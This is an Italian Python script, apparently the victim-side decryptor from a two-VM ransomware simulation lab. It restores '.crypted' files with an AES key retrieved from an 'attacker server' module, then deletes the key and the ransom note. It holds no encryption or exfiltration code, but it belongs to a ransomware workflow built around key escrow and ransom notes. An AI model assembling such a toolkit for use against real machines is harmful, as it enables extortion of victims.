#(Il Ripristino su VM 2)
#Lo script che utilizza la chiave AES decifrata (ottenuta dal server) per ripristinare i file.
# decryptor.py - Eseguito su VM 2 (Vittima) per il ripristino finale

import os
# Importa la funzione di decifratura AES da utils
from vm1_attacker_server.utils import decifra_aes 

# --- Configurazione ---
TEST_DIR = "test_files"
DECRYPTED_KEY_FILE = os.path.join(TEST_DIR, "decrypted_key_from_server.key")
RANSOM_NOTE_FILE = os.path.join(TEST_DIR, "LEGGIMI_DECRIPTARE.txt")
ENCRYPTED_EXTENSION = ".crypted"

def ripristina_file():
    """Recupera la chiave AES decifrata e decifra tutti i file .crypted."""
    print("\n--- INIZIO RIPRISTINO FILE (VM 2) ---")

    # (1) Caricamento della chiave AES decifrata (ottenuta dal server)
    try:
        with open(DECRYPTED_KEY_FILE, "rb") as f:
            chiave_aes_originale = f.read()
        print("✅ Chiave AES originale caricata, pronta per la decifratura dei file.")
    except FileNotFoundError:
        print(f"❌ Errore: Chiave decifrata '{DECRYPTED_KEY_FILE}' non trovata. Eseguire la comunicazione client/server prima.")
        return

    # (2) Scansione e decifratura di tutti i file cifrati
    count = 0
    for filename in os.listdir(TEST_DIR):
        if filename.endswith(ENCRYPTED_EXTENSION):
            file_path = os.path.join(TEST_DIR, filename)
            output_path = file_path.replace(ENCRYPTED_EXTENSION, "") 
            
            try:
                with open(file_path, "rb") as f:
                    dati_cifrati_completi = f.read()
                
                # Decifratura del contenuto con la chiave AES
                dati_originali = decifra_aes(chiave_aes_originale, dati_cifrati_completi)
                
                with open(output_path, "wb") as f:
                    f.write(dati_originali)
                    
                os.remove(file_path)
                print(f"✅ Ripristinato: {output_path}")
                count += 1

            except Exception as e:
                print(f"❌ Errore durante la decifratura AES di {filename}: {e}")
                
    # (3) Pulizia finale
    if os.path.exists(DECRYPTED_KEY_FILE):
        os.remove(DECRYPTED_KEY_FILE)
    if os.path.exists(RANSOM_NOTE_FILE):
        os.remove(RANSOM_NOTE_FILE)
        
    print(f"🎉 Ripristino completato. {count} file decifrati.")

if __name__ == "__main__":
    ripristina_file()
